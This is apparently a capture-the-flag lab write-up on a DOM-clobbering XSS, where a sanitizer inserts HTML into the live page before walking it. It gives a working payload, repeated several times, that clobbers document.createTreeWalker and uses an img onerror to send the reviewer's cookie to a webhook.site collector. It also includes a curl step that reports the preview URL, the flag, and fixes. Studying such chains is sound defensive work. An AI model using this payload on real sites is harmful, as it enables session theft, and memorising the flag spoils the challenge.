# JSrace Live DOM Sanitizer Clobbering

## What Is Happening

The [JSrace lab](https://f766430900d4.pwnbox-lab.com/) allows an authenticated user to upload an HTML or SVG snippet, preview it at `/p/<id>`, and report that preview URL to a reviewer bot.

The preview page fetches the raw snippet from `/raw/<id>` and renders it with `setHTML(target, raw)`. Unlike a detached-tree sanitizer, this version writes the untrusted HTML into the live preview DOM first and only then starts sanitizing it.

That creates a DOM-clobbering window before the walk begins.

## Why It Happens

The key sink is:

```javascript
window.setHTML = function setHTML(targetEl, raw) {
  if (!targetEl) throw new Error('setHTML: missing target element');
  targetEl.innerHTML = String(raw);
  sanitize(targetEl);
};
```

The sanitizer does cache several `Element.prototype` accessors, but it still looks up the walker through the live document:

```javascript
const walker = (root.ownerDocument || document).createTreeWalker(
  root, NodeFilter.SHOW_ELEMENT
);
```

Because attacker HTML is already mounted, this payload can clobber that lookup:

```html
<img name="createTreeWalker">
```

Then a second image provides a fast execution sink:

```html
<img src=x onerror="fetch('https://webhook.site/96bdff61-82fe-4377-8431-b14c437322a3?c='+encodeURIComponent(document.cookie))">
```

Combined payload:

```html
<img name="createTreeWalker"><img src=x onerror="fetch('https://webhook.site/96bdff61-82fe-4377-8431-b14c437322a3?c='+encodeURIComponent(document.cookie))">
```

When `sanitize()` runs, `document.createTreeWalker` is no longer the real function. Sanitizer setup throws before `onerror` is removed, and the second broken image fires immediately in the reviewer context.

## Exact Test

Upload:

```html
<img name="createTreeWalker"><img src=x onerror="fetch('https://webhook.site/96bdff61-82fe-4377-8431-b14c437322a3?c='+encodeURIComponent(document.cookie))">
```

Then report the preview URL:

```bash
curl -sS -X POST "https://f766430900d4.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://f766430900d4.pwnbox-lab.com/p/2e34c542bbb46152192dfe26"}'
```

## Expected Signal

- the preview inserts both images into the live DOM
- `document.createTreeWalker` becomes clobbered
- `sanitize()` throws before the event-handler pass completes
- the second image fires `onerror`
- the collector receives the reviewer's cookie

## Result Interpretation

Confirmed exploit chain:

```text
live DOM insertion
-> document.createTreeWalker clobbered by named element
-> sanitizer startup failure
-> unsanitized img onerror survives briefly
-> reviewer cookie exfiltrated
```

Webhook result:

```text
flag=pwnbox{47b1d83fa9e60c25f4382a7d1ce95b06}
```

## Root Cause

The sanitizer trusted a live document property lookup after attacker-controlled DOM had already been inserted. That made `document.createTreeWalker` clobberable and turned sanitizer failure into a same-origin XSS primitive.

## Impact

- Same-origin JavaScript execution in the reviewer browser.
- Theft of readable cookies from the reviewer session.
- In a real deployment, likely reviewer compromise or unauthorized actions in the preview origin.

## Fix

- Sanitize in a detached tree before inserting any attacker HTML into the live DOM.
- Cache `Document.prototype.createTreeWalker` and call it through the prototype.
- Fail closed on sanitizer exceptions so unsanitized markup is never briefly exposed.
- Add browser-based tests for named-property DOM clobbering, not only generic unit tests.

## Key Lesson

If a sanitizer renders first and walks second, every post-insert host-object lookup is part of the attack surface. Even a mostly prototype-safe sanitizer can still fail if one uncached `document.*` method remains attacker-clobberable.

## Flag

`pwnbox{47b1d83fa9e60c25f4382a7d1ce95b06}`
